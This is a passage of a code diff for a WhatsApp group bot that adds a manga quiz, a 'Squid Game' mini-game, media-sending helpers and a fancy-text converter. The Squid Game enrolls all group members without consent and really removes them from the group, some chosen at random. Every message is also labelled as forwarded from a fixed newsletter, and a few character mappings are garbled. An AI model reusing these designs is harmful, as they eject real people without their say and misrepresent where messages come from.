+      text: `⚠️ A quiz is already in progress!\n\n❓ ${existing.data.current.q}\n\n_${config.prefix}quiz stop → stop_`
+    });
+    return;
+  }
+
+  // Nombre de questions
+  const total = Math.min(parseInt(args[0]) || 10, 15);
+  const questions = [...QUIZ_MANGA].sort(() => Math.random() - 0.5).slice(0, total);
+
+  gameState.set(remoteJid, {
+    type: 'quiz',
+    data: {
+      questions,
+      index: 0,
+      current: questions[0],
+      scores: {},
+      total,
+      startTime: Date.now(),
+      hintUsed: false
+    }
+  });
+
+  await sock.sendMessage(remoteJid, {
+    text: `🍥 *QUIZ MANGA COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📚 *${total} questions* sur les mangas!\nAnswer in chat — first to answer correctly wins the point!\n\n_${config.prefix}quiz stop → stop_\n\n━━━━━━━━━━━━━━━━━━━━━━━\n\n❓ *Question 1/${total}:*\n${questions[0].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint (-1 pt)_`
+  });
+
+  // Timer 30s par question
+  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up! No one found it.'), 30000);
+}
+
+function formatQuizScores(scores) {
+  if (Object.keys(scores).length === 0) return '_No points scored_';
+  return Object.entries(scores)
+    .sort(([,a],[,b]) => b - a)
+    .map(([jid, pts], i) => `${i===0?'🥇':i===1?'🥈':'🥉'} @${jid.split('@')[0]}: ${pts} pt(s)`)
+    .join('\n');
+}
+
+async function advanceQuizQuestion(sock, remoteJid, prefix = '') {
+  const state = gameState.get(remoteJid);
+  if (!state || state.type !== 'quiz') return;
+
+  const { questions, index, total, scores } = state.data;
+  const nextIndex = index + 1;
+
+  if (nextIndex >= total) {
+    // Fin du quiz
+    gameState.delete(remoteJid);
+    const winner = Object.entries(scores).sort(([,a],[,b]) => b-a)[0];
+    await sock.sendMessage(remoteJid, {
+      text: `${prefix ? prefix + '\n\n' : ''}🏁 *FIN DU QUIZ MANGA!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📊 *Final ranking:*\n${formatQuizScores(scores)}\n\n${winner ? `🏆 Winner: @${winner[0].split('@')[0]} with ${winner[1]} point(s)!` : 'No winner!'}`,
+      mentions: winner ? [winner[0]] : []
+    });
+    return;
+  }
+
+  state.data.index    = nextIndex;
+  state.data.current  = questions[nextIndex];
+  state.data.hintUsed = false;
+
+  await sock.sendMessage(remoteJid, {
+    text: `${prefix ? prefix + '\n\n' : ''}❓ *Question ${nextIndex+1}/${total}:*\n${questions[nextIndex].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint_`
+  });
+
+  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up!'), 30000);
+}
+
+async function processQuizAnswer(sock, message, text, remoteJid, senderJid, state) {
+  const { current, hintUsed, scores } = state.data;
+  const prefix = config.prefix;
+
+  // Indice
+  if (text.toLowerCase() === `${prefix}hint` || text.toLowerCase() === prefix + 'hint') {
+    if (!hintUsed) {
+      state.data.hintUsed = true;
+      await sock.sendMessage(remoteJid, { text: `💡 *Hint:* ${current.hint}` });
+    }
+    return;
+  }
+
+  // Vérifier réponse
+  if (text.toLowerCase().trim() === current.a.toLowerCase()) {
+    scores[senderJid] = (scores[senderJid] || 0) + (hintUsed ? 0.5 : 1);
+    const pts = scores[senderJid];
+    await sock.sendMessage(remoteJid, {
+      text: `✅ *CORRECT ANSWER!*\n🎉 @${senderJid.split('@')[0]} → +${hintUsed?'0.5':'1'} pt (Total: ${pts})\n\n📖 Answer: *${current.a}*`,
+      mentions: [senderJid]
+    });
+    await advanceQuizQuestion(sock, remoteJid);
+  }
+}
+
+// =============================================
+// 🦑 SQUID GAME
+// =============================================
+const SQUID_ROUNDS = [
+  { name: '🔴 Feu Rouge / 🟢 Feu Vert', instruction: '🟢 = *AVANCER*  |  🔴 = *RESTER IMMOBILE*\n\nRéagissez with 🟢 pour avancer et survivre!', target: '🟢', wrong: '🔴', duration: 25000 },
+  { name: '🍬 Dalgona Challenge', instruction: '🟢 = *DÉCOUPER AVEC SOIN*  |  🔴 = *TROP RAPIDE (éliminé)*\n\nRéagissez with 🟢 pour réussir!', target: '🟢', wrong: '🔴', duration: 20000 },
+  { name: '🪆 Marbles Game', instruction: '🟢 = *JOUER*  |  🔴 = *ABANDONNER*\n\nRéagissez with 🟢 pour continuer!', target: '🟢', wrong: '🔴', duration: 30000 },
+  { name: '🌉 Glass Bridge', instruction: '🟢 = *VERRE SOLIDE*  |  🔴 = *VERRE FRAGILE (mort)*\n\nRéagissez with 🟢 pour traverser!', target: '🟢', wrong: '🔴', duration: 15000 },
+  { name: '🗡️ Round Final - Squid Game', instruction: '🟢 = *ATTAQUER*  |  🔴 = *DÉFENDRE*\n\nRéagissez with 🟢 pour gagner le round final!', target: '🟢', wrong: '🔴', duration: 20000 },
+];
+
+async function handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup) {
+  if (!isGroup) {
+    await sock.sendMessage(remoteJid, { text: '❌ Squid Game → groups only!' });
+    return;
+  }
+
+  const existing = gameState.get(remoteJid);
+  if (existing?.type === 'squidgame') {
+    if (args[0] === 'stop') {
+      gameState.delete(remoteJid);
+      await sock.sendMessage(remoteJid, { text: '🛑 Squid Game arrêté par l\'admin.' });
+      return;
+    }
+    await sock.sendMessage(remoteJid, { text: `⚠️ A Squid Game is already in progress!\n_${config.prefix}squidgame stop → stop_` });
+    return;
+  }
+
+  // Récupérer tous les participants du groupe
+  let participants = [];
+  try {
+    const meta = await sock.groupMetadata(remoteJid);
+    participants = meta.participants.map(p => p.id).filter(id => id !== sock.user?.id && id !== senderJid);
+  } catch(e) {
+    await sock.sendMessage(remoteJid, { text: '❌ Unable to fetch group members.' });
+    return;
+  }
+
+  if (participants.length < 4) {
+    await sock.sendMessage(remoteJid, { text: '❌ At least 4 members needed to play!' });
+    return;
+  }
+
+  // Init état
+  gameState.set(remoteJid, {
+    type: 'squidgame',
+    data: {
+      players: new Set(participants),     // players still alive
+      eliminated: new Set(),              // eliminated
+      roundIndex: 0,
+      reactions: new Map(),               // senderJid → emoji
+      roundActive: false,
+      host: senderJid,
+      startTime: Date.now()
+    }
+  });
+
+  const mentions = participants.slice(0, 20); // max 20 mentions
+  await sock.sendMessage(remoteJid, {
+    text: `🦑 *SQUID GAME COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👥 *${participants.length} participant(s)* enregistrés!\n` +
+      `🎯 Survive all rounds to win!\n\n` +
+      `📋 *Règles:*\n` +
+      `• Réagissez with le bon emoji quand demandé\n` +
+      `• 🟢 = Good action | 🔴 = Wrong action\n` +
+      `• Si 3 rounds without reaction → 10 players kicked\n` +
+      `• 4 good reactions = round protection\n\n` +
+      `⏳ *Round 1 starts in 5 seconds...*\n\n` +
+      `${participants.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
+    mentions
+  });
+
+  setTimeout(() => startSquidRound(sock, remoteJid), 5000);
+}
+
+async function startSquidRound(sock, remoteJid) {
+  const state = gameState.get(remoteJid);
+  if (!state || state.type !== 'squidgame') return;
+
+  const { roundIndex, players, eliminated } = state.data;
+
+  if (roundIndex >= SQUID_ROUNDS.length || players.size === 0) {
+    await endSquidGame(sock, remoteJid, state);
+    return;
+  }
+
+  const round = SQUID_ROUNDS[roundIndex];
+  state.data.reactions  = new Map();
+  state.data.roundActive = true;
+
+  const alive = [...players];
+  const mentions = alive.slice(0, 20);
+
+  await sock.sendMessage(remoteJid, {
+    text: `🦑 *ROUND ${roundIndex + 1}: ${round.name}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `${round.instruction}\n\n` +
+      `👥 Players remaining: *${players.size}*\n` +
+      `⏱️ You have *${round.duration / 1000} seconds!*\n\n` +
+      `${alive.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
+    mentions
+  });
+
+  // Timer de fin de round
+  setTimeout(() => endSquidRound(sock, remoteJid, round), round.duration);
+}
+
+async function processSquidReaction(sock, message, text, remoteJid, senderJid, state) {
+  const { roundActive, players, reactions } = state.data;
+  if (!roundActive) return;
+  if (!players.has(senderJid)) return; // Déjà éliminé
+
+  const emoji = text.trim();
+  if (emoji === '🟢' || emoji === '🔴') {
+    reactions.set(senderJid, emoji);
+  }
+}
+
+async function endSquidRound(sock, remoteJid, round) {
+  const state = gameState.get(remoteJid);
+  if (!state || state.type !== 'squidgame') return;
+
+  state.data.roundActive = false;
+  const { players, reactions, eliminated, roundIndex } = state.data;
+
+  const goodReactions  = [...reactions.entries()].filter(([,e]) => e === round.target).map(([j]) => j);
+  const wrongReactions = [...reactions.entries()].filter(([,e]) => e === round.wrong).map(([j]) => j);
+  const noReaction     = [...players].filter(j => !reactions.has(j));
+
+  // Éliminer ceux qui ont réagi with le mauvais emoji
+  wrongReactions.forEach(j => { players.delete(j); eliminated.add(j); });
+
+  let resultText = `📊 *RÉSULTAT ROUND ${roundIndex + 1}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  resultText += `✅ Good reactions: *${goodReactions.length}*\n`;
+  resultText += `❌ Wrong reactions: *${wrongReactions.length}*\n`;
+  resultText += `😶 No reaction: *${noReaction.length}*\n\n`;
+
+  // Règle: si 0 bonne réaction sur 3 rounds consécutifs → expulser 10
+  state.data.noReactionStreak = (state.data.noReactionStreak || 0);
+  if (goodReactions.length === 0) {
+    state.data.noReactionStreak++;
+    if (state.data.noReactionStreak >= 3) {
+      // Expulser 10 joueurs aléatoires
+      const toKick = [...players].sort(() => Math.random() - 0.5).slice(0, Math.min(10, players.size));
+      toKick.forEach(j => { players.delete(j); eliminated.add(j); });
+      resultText += `☠️ *3 rounds without reaction! 10 players kicked!*\n`;
+      resultText += toKick.map(j => `• @${j.split('@')[0]}`).join('\n') + '\n\n';
+      state.data.noReactionStreak = 0;
+
+      try {
+        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
+        if (botIsAdmin) {
+          for (const jid of toKick) {
+            await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
+            await delay(500);
+          }
+        }
+      } catch(e) {}
+    }
+  } else if (goodReactions.length >= 4) {
+    // Protection: les 4+ premiers protégés ce round
+    state.data.noReactionStreak = 0;
+    resultText += `🛡️ *${goodReactions.length} joueurs ont réagi correctement → protégés ce round!*\n\n`;
+  } else {
+    state.data.noReactionStreak = 0;
+  }
+
+  // Expulser les mauvaises réactions du groupe
+  if (wrongReactions.length > 0) {
+    try {
+      const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
+      if (botIsAdmin) {
+        for (const jid of wrongReactions) {
+          await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
+          await delay(500);
+        }
+      }
+    } catch(e) {}
+    resultText += `🚪 *Eliminated:*\n${wrongReactions.map(j => `• @${j.split('@')[0]}`).join('\n')}\n\n`;
+  }
+
+  resultText += `👥 *Survivors: ${players.size}*\n`;
+
+  const allMentions = [...goodReactions, ...wrongReactions, ...noReaction].slice(0, 20);
+  await sock.sendMessage(remoteJid, { text: resultText, mentions: allMentions });
+
+  state.data.roundIndex++;
+
+  if (players.size <= 1) {
+    await endSquidGame(sock, remoteJid, state);
+    return;
+  }
+
+  await delay(4000);
+  await startSquidRound(sock, remoteJid);
+}
+
+async function endSquidGame(sock, remoteJid, state) {
+  gameState.delete(remoteJid);
+  const { players, eliminated } = state.data;
+
+  const winners = [...players];
+  const winMentions = winners.slice(0, 10);
+
+  await sock.sendMessage(remoteJid, {
+    text: `🦑 *SQUID GAME TERMINÉ!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `${winners.length > 0
+        ? `🏆 *${winners.length} GAGNANT(S):*\n${winners.map(j => `👑 @${j.split('@')[0]}`).join('\n')}`
+        : '☠️ *Tous les joueurs ont été eliminated!*'
+      }\n\n` +
+      `📊 Eliminated: ${eliminated.size}\n` +
+      `🎮 Rounds joués: ${state.data.roundIndex}\n\n` +
+      `_Thanks for playing Squid Game!_ 🦑`,
+    mentions: winMentions
+  });
+}
+
+// =============================================
+// 🖼️ SYSTÈME D'IMAGES PAR COMMANDE
+// =============================================
+// Place une image dans le dossier du bot nommée:
+//   ping.jpg, alive.jpg, info.jpg, sticker.jpg...
+// Le bot l'enverra automatiquement en caption!
+// Formats supportés: .jpg .jpeg .png .gif .webp
+// =============================================
+
+// =============================================
+// 🔧 BUILD META QUOTE — Crée un message cité stylé
+// =============================================
+function buildMetaQuote(latencyMs = null) {
+  return null;
+}
+
+// =============================================
+// 🏅 BADGE CONTEXT — Contexte avec badge stylé
+// =============================================
+function buildBadgeCtx() {
+  const BADGE_CTX = {
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363422398514286@newsletter',
+      serverMessageId: 1,
+      newsletterName: 'SEIGNEUR TD'
+    }
+  };
+  return BADGE_CTX;
+}
+
+async function sendWithImage(sock, remoteJid, cmdName, text, mentions = [], latencyMs = null, buttons = null) {
+  const videoExts = ['.mp4','.mov','.mkv'], imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
+  let mediaPath = null, mediaType = null;
+  for (const ext of videoExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='video';break;} }
+  if (!mediaPath) { for (const ext of imageExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='image';break;} } }
+
+  const mq = buildMetaQuote(latencyMs);
+  const badge = buildBadgeCtx();
+  const sendOpts = mq ? { quoted: mq } : {};
+  const btnField = buttons ? { buttons, headerType: 1, viewOnce: true } : {};
+
+  let sentMsg;
+  try {
+    if (mediaPath && mediaType === 'video') {
+      sentMsg = await sock.sendMessage(remoteJid, {
+        video: fs.readFileSync(mediaPath),
+        caption: text,
+        gifPlayback: false,
+        mentions,
+        contextInfo: badge,
+        ...btnField
+      }, sendOpts);
+    } else if (mediaPath && mediaType === 'image') {
+      sentMsg = await sock.sendMessage(remoteJid, {
+        image: fs.readFileSync(mediaPath),
+        caption: text,
+        mentions,
+        contextInfo: badge,
+        ...btnField
+      }, sendOpts);
+    } else {
+      sentMsg = await sock.sendMessage(remoteJid, {
+        text,
+        mentions,
+        contextInfo: badge,
+        ...btnField
+      }, sendOpts);
+    }
+  } catch(e) {
+    try { sentMsg = await sock.sendMessage(remoteJid, { text, mentions }); } catch(e2) {}
+  }
+
+  sendCmdAudio(sock, remoteJid).catch(() => {});
+  return sentMsg;
+}
+
+// =============================================
+// ✨ COMMANDE FANCY — Convertir texte en styles
+// Usage: !fancy [numéro] [texte]
+//        !fancy [texte]  → liste tous les styles
+// =============================================
+async function handleFancy(sock, args, remoteJid, senderJid) {
+  if (!args.length) {
+    await sock.sendMessage(remoteJid, {
+      text: `✨ *FANCY - Styles de texte*\n\nUsage:\n• ${config.prefix}fancy [texte] → voir tous les styles\n• ${config.prefix}fancy [numéro] [texte] → style spécifique\n\nEx: ${config.prefix}fancy CyberToji\nEx: ${config.prefix}fancy 10 CyberToji`
+    });
+    return;
+  }
+
+  // Détecter si le premier arg est un numéro
+  const firstArg = args[0];
+  let styleNum = parseInt(firstArg);
+  let text;
+
+  if (!isNaN(styleNum) && args.length > 1) {
+    text = args.slice(1).join(' ');
+  } else {
+    styleNum = null;
+    text = args.join(' ');
+  }
+
+  // Table de conversion lettre → fancy par style
+  // Chaque style a un mapping complet A-Z a-z 0-9
+  function applyStyle(text, styleIndex) {
+    const styles = [
+      // 1 - ຊ໐k໐น style Thai/Lao
+      { map: {'a':'ส','b':'ც','c':'ċ','d':'ɗ','e':'ε','f':'ƒ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'๓','n':'ŋ','o':'໐','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'น','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'ส','B':'ც','C':'Ċ','D':'Ɗ','E':'Ε','F':'Ƒ','G':'Ɠ','H':'Ɦ','I':'I','J':'ʝ','K':'Ƙ','L':'Ⴊ','M':'๓','N':'Ŋ','O':'໐','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'น','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
+      // 2 - ʑơƙơų style
+      { map: {'a':'ą','b':'ɓ','c':'ƈ','d':'ɗ','e':'ɛ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'ɱ','n':'ŋ','o':'ơ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'ų','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɗ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ƙ','L':'ʟ','M':'ɱ','N':'Ŋ','O':'Ơ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'Ų','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
+      // 3 - 乙のズのひ Japanese
+      { map: {'a':'ά','b':'乃','c':'ς','d':'∂','e':'ε','f':'ƒ','g':'g','h':'ん','i':'ι','j':'j','k':'ズ','l':'ℓ','m':'ﾶ','n':'η','o':'の','p':'ρ','q':'q','r':'尺','s':'丂','t':'τ','u':'ひ','v':'ν','w':'ω','x':'χ','y':'ソ','z':'乙','A':'ά','B':'乃','C':'ς','D':'∂','E':'Ε','F':'Ƒ','G':'G','H':'ん','I':'ι','J':'J','K':'ズ','L':'ℓ','M':'ﾶ','N':'η','O':'の','P':'Ρ','Q':'Q','R':'尺','S':'丂','T':'τ','U':'ひ','V':'Ν','W':'Ω','X':'Χ','Y':'ソ','Z':'乙'} },
+      // 4 - 乙ㄖҜㄖㄩ Leet/Kanji
+      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᗴ','f':'ᖴ','g':'Ǥ','h':'ᕼ','i':'ι','j':'ᒍ','k':'Ҝ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'ㄖ','p':'ᑭ','q':'Ƣ','r':'ᖇ','s':'Ş','t':'ƬΉΣ','u':'ᑌ','v':'᙮᙮','w':'ᗯ','x':'᙭','y':'ƳΘᑌ','z':'乙','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᗴ','F':'ᖴ','G':'Ǥ','H':'ᕼ','I':'ι','J':'ᒍ','K':'Ҝ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'ㄖ','P':'ᑭ','Q':'Ƣ','R':'ᖇ','S':'Ş','T':'Ƭ','U':'ᑌ','V':'᙮᙮','W':'ᗯ','X':'᙭','Y':'Ƴ','Z':'乙'} },
+      // 5 - 🅉🄾🄺🄾🅄 Enclosed letters
+      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
+      // 6 - ፚᎧᏦᎧᏬ Ethiopian/Cherokee
+      { map: {'a':'Ꭺ','b':'Ᏸ','c':'Ꮯ','d':'Ꭰ','e':'Ꮛ','f':'Ꭶ','g':'Ꮆ','h':'Ꮒ','i':'Ꭵ','j':'Ꮰ','k':'Ꮶ','l':'Ꮮ','m':'Ꮇ','n':'Ꮑ','o':'Ꭷ','p':'Ꭾ','q':'Ꭴ','r':'Ꮢ','s':'Ꮥ','t':'Ꮦ','u':'Ꮜ','v':'Ꮩ','w':'Ꮃ','x':'Ꮙ','y':'Ꮍ','z':'ፚ','A':'Ꭺ','B':'Ᏸ','C':'Ꮯ','D':'Ꭰ','E':'Ꮛ','F':'Ꭶ','G':'Ꮆ','H':'Ꮒ','I':'Ꭵ','J':'Ꮰ','K':'Ꮶ','L':'Ꮮ','M':'Ꮇ','N':'Ꮑ','O':'Ꭷ','P':'Ꭾ','Q':'Ꭴ','R':'Ꮢ','S':'Ꮥ','T':'Ꮦ','U':'Ꮜ','V':'Ꮩ','W':'Ꮃ','X':'Ꮙ','Y':'Ꮍ','Z':'ፚ'} },
+      // 7 - ᘔOKOᑌ Canadian Aboriginal
+      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᕮ','f':'ᖴ','g':'ᘜ','h':'ᕼ','i':'ᓰ','j':'ᒍ','k':'ᛕ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'O','p':'ᑭ','q':'ᕴ','r':'ᖇ','s':'ᔕ','t':'ᗪ','u':'ᑌ','v':'ᐯ','w':'ᗯ','x':'ᘔ','y':'ᖻ','z':'ᘔ','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᕮ','F':'ᖴ','G':'ᘜ','H':'ᕼ','I':'ᓰ','J':'ᒍ','K':'ᛕ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'O','P':'ᑭ','Q':'ᕴ','R':'ᖇ','S':'ᔕ','T':'ᗪ','U':'ᑌ','V':'ᐯ','W':'ᗯ','X':'ᘔ','Y':'ᖻ','Z':'ᘔ'} },
+      // 8 - ʐօӄօʊ Armenian
+      { map: {'a':'ą','b':'ҍ','c':'ç','d':'ժ','e':'ҽ','f':'ƒ','g':'ց','h':'հ','i':'ì','j':'ʝ','k':'ҟ','l':'Ӏ','m':'ʍ','n':'ղ','o':'օ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'է','u':'մ','v':'ѵ','w':'ա','x':'×','y':'վ','z':'ʐ','A':'Ą','B':'Ҍ','C':'Ç','D':'Ժ','E':'Ҽ','F':'Ƒ','G':'Ց','H':'Հ','I':'Ì','J':'ʝ','K':'Ҟ','L':'Ӏ','M':'ʍ','N':'Ղ','O':'Օ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Է','U':'Մ','V':'Ѵ','W':'Ա','X':'×','Y':'Վ','Z':'ʐ'} },
+      // 9 - 𝚉𝚘𝚔𝚘𝚞 Monospace
+      { range: [0x1D670, 0x1D689, 0x1D670] }, // handled separately
+      // 10 - 𝙕𝙤𝙠𝙤𝙪 Bold Italic
+      { range: [0x1D468, 0x1D481, 0x1D468] },
+      // 11 - 𝐙𝐨𝐤𝐨𝐮 Bold
+      { range: [0x1D400, 0x1D419, 0x1D400] },
+      // 12 - 𝗭𝗼𝗸𝗼𝘂 Bold Sans
+      { range: [0x1D5D4, 0x1D5ED, 0x1D5D4] },
+      // 13 - 𝘡𝘰𝘬𝘰𝘶 Italic Sans
+      { range: [0x1D608, 0x1D621, 0x1D608] },
+      // 14 - Zσƙσυ Greek-ish
+      { map: {'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'ƒ','g':'g','h':'н','i':'ι','j':'נ','k':'ƙ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'з','A':'Α','B':'В','C':'¢','D':'∂','E':'Є','F':'Ƒ','G':'G','H':'Η','I':'Ι','J':'נ','K':'Ƙ','L':'ℓ','M':'М','N':'Η','O':'Ω','P':'Ρ','Q':'Q','R':'Я','S':'Ѕ','T':'Τ','U':'Υ','V':'Ν','W':'Ω','X':'Χ','Y':'Υ','Z':'Ζ'} },
+      // 15 - ⱫØ₭ØɄ Currency
+      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
+      // 16 - Zðkðµ
+      { map: {'a':'å','b':'ƀ','c':'ċ','d':'ð','e':'ê','f':'ƒ','g':'ĝ','h':'ĥ','i':'î','j':'ĵ','k':'ķ','l':'ļ','m':'m','n':'ñ','o':'ð','p':'þ','q':'q','r':'ŗ','s':'ş','t':'ţ','u':'µ','v':'v','w':'ŵ','x':'x','y':'ÿ','z':'ƶ','A':'Å','B':'Ƀ','C':'Ċ','D':'Ð','E':'Ê','F':'Ƒ','G':'Ĝ','H':'Ĥ','I':'Î','J':'Ĵ','K':'Ķ','L':'Ļ','M':'M','N':'Ñ','O':'Ð','P':'Þ','Q':'Q','R':'Ŗ','S':'Ş','T':'Ţ','U':'Ü','V':'V','W':'Ŵ','X':'X','Y':'Ÿ','Z':'Ƶ'} },
+      // 17 - zσкσυ Cyrillic Greek
+      { map: {'a':'α','b':'в','c':'с','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'і','j':'ʝ','k':'к','l':'l','m':'м','n':'η','o':'σ','p':'р','q':'q','r':'г','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ш','x':'χ','y':'у','z':'z','A':'Α','B':'В','C':'С','D':'D','E':'Є','F':'F','G':'G','H':'Н','I':'І','J':'J','K':'К','L':'L','M':'М','N':'Η','O':'Ω','P':'Р','Q':'Q','R':'Г','S':'Ѕ','T':'Т','U':'Υ','V':'Ν','W':'Ш','X':'Χ','Y':'У','Z':'Z'} },
+      // 18 - ɀօҟօմ Armenian mix
+      { map: {'a':'ɑ','b':'ɓ','c':'ƈ','d':'ɖ','e':'ɘ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ҟ','l':'ʟ','m':'ɱ','n':'ɳ','o':'ɔ','p':'ρ','q':'q','r':'ɹ','s':'ʂ','t':'ƭ','u':'ʋ','v':'ʌ','w':'ɯ','x':'χ','y':'ʎ','z':'ɀ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɖ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ҟ','L':'ʟ','M':'Ɱ','N':'ɳ','O':'Ɔ','P':'Ρ','Q':'Q','R':'ɹ','S':'Ʂ','T':'Ƭ','U':'Ʋ','V':'Ʌ','W':'Ɯ','X':'Χ','Y':'ʎ','Z':'ɀ'} },
+      // 19 - ZӨKӨЦ Cyrillic caps
+      { map: {'a':'Δ','b':'Ъ','c':'С','d':'D','e':'Є','f':'F','g':'Ǵ','h':'Н','i':'І','j':'J','k':'К','l':'Ĺ','m':'М','n':'Й','o':'Θ','p':'Р','q':'Q','r':'Я','s':'Ş','t':'Т','u':'Ц','v':'V','w':'W','x':'Х','y':'Ч','z':'Z','A':'Δ','B':'Ъ','C':'С','D':'D','E':'Є','F':'F','G':'Ǵ','H':'Н','I':'І','J':'J','K':'К','L':'Ĺ','M':'М','N':'Й','O':'Θ','P':'Р','Q':'Q','R':'Я','S':'Ş','T':'Т','U':'Ц','V':'V','W':'W','X':'Х','Y':'Ч','Z':'Z'} },
+      // 20 - Subscript
+      { map: {'a':'ₐ','b':'b','c':'c','d':'d','e':'ₑ','f':'f','g':'g','h':'ₕ','i':'ᵢ','j':'ⱼ','k':'ₖ','l':'ₗ','m':'ₘ','n':'ₙ','o':'ₒ','p':'ₚ','q':'q','r':'ᵣ','s':'ₛ','t':'ₜ','u':'ᵤ','v':'ᵥ','w':'w','x':'ₓ','y':'y','z':'z','A':'ₐ','B':'B','C':'C','D':'D','E':'ₑ','F':'F','G':'G','H':'ₕ','I':'ᵢ','J':'ⱼ','K':'ₖ','L':'ₗ','M':'ₘ','N':'ₙ','O':'ₒ','P':'ₚ','Q':'Q','R':'ᵣ','S':'ₛ','T':'ₜ','U':'ᵤ','V':'ᵥ','W':'W','X':'ₓ','Y':'Y','Z':'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'} },
+      // 21 - Superscript
